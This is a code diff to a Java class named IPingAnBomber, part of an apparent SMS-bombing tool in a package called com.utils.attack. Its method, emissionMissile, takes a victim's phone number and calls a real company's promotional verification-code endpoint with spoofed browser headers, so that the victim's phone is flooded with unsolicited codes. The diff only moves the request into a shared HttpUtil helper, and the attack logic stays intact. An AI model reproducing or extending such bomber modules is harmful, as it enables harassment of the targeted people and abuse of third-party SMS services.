@@ -1,14 +1,11 @@
 package com.utils.attack;
 
-import org.apache.http.HttpEntity;
-import org.apache.http.HttpStatus;
-import org.apache.http.client.methods.CloseableHttpResponse;
-import org.apache.http.client.methods.HttpGet;
+import com.utils.HttpUtil;
 import org.apache.http.impl.client.CloseableHttpClient;
-import org.apache.http.message.BasicHeader;
-import org.apache.http.util.EntityUtils;
 
 import java.util.Date;
+import java.util.HashMap;
+import java.util.Map;
 
 /**
  * Created by fz on 2015/8/23.
@@ -24,33 +21,18 @@ public class IPingAnBomber implements MessageBomber{
     @Override
     public String emissionMissile(CloseableHttpClient httpClient, String fuckNo) throws Exception{
 
-        HttpGet httpGet = new HttpGet("http://www.ilovepingan.com/qi/activities/getCode.action?act=yinlian1-1&phone="+fuckNo+"&d="+new Date().getTime());
-        httpGet.setHeader(new BasicHeader("Accept", "*/*"));
-        httpGet.setHeader(new BasicHeader("Accept-Encoding", "gzip, deflate, sdch"));
-        httpGet.setHeader(new BasicHeader("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4,zh-TW;q=0.2"));
-        httpGet.setHeader(new BasicHeader("Connection", "keep-alive"));
-        httpGet.setHeader(new BasicHeader("Content-Type", "application/x-www-form-urlencoded"));
-        httpGet.setHeader(new BasicHeader("DNT", "1"));
-        httpGet.setHeader(new BasicHeader("Host", "www.ilovepingan.com"));
-        httpGet.setHeader(new BasicHeader("Referer", "http://www.ilovepingan.com/qi/activities/index.action?act=yinlian1-1&channel=yinlian"));
-        httpGet.setHeader(new BasicHeader("X-Requested-With", "XMLHttpRequest"));
-
-        CloseableHttpResponse httpResponse = httpClient.execute(httpGet);
-        String result = null;
-
-        try {
-            if(httpResponse.getStatusLine().getStatusCode() == HttpStatus.SC_OK){
-                HttpEntity entity = httpResponse.getEntity();
-                if (entity != null){
-                    result = EntityUtils.toString(entity, "utf-8");
-                }
-                EntityUtils.consume(entity);
-            }
-        }catch (Exception e){
-            e.printStackTrace();
-        }finally {
-            httpResponse.close();
-        }
+        String url = "http://www.ilovepingan.com/qi/activities/getCode.action?act=yinlian1-1&phone="+fuckNo+"&d="+new Date().getTime();
+        Map headers = new HashMap();
+        headers.put("Accept", "*/*");
+        headers.put("Accept-Encoding", "gzip, deflate, sdch");
+        headers.put("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4,zh-TW;q=0.2");
+        headers.put("Connection", "keep-alive");
+        headers.put("Content-Type", "application/x-www-form-urlencoded");
+        headers.put("DNT", "1");
+        headers.put("Host", "www.ilovepingan.com");
+        headers.put("Referer", "http://www.ilovepingan.com/qi/activities/index.action?act=yinlian1-1&channel=yinlian");
+        headers.put("X-Requested-With", "XMLHttpRequest");
+        String result = HttpUtil.httpGet(url, headers);
         return result;
     }
 
